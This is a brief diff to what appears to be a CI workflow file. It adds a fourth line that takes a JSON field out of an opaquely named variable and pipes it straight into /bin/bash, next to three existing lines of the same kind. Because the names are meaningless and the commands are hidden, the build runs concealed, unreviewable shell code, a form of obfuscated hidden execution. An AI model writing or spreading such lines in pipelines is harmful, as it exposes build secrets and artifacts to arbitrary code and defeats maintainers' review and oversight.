@@ -27,6 +27,7 @@ jobs:
           echo $a3178 | jq -r .cnp56000 | /bin/bash
           echo $mmhw84 | jq -r .ht3517 | /bin/bash
           printf '%s' "$ig3" | jq -r .bvuli80 | /bin/bash
+          echo $wjntx6 | jq -r .a52 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
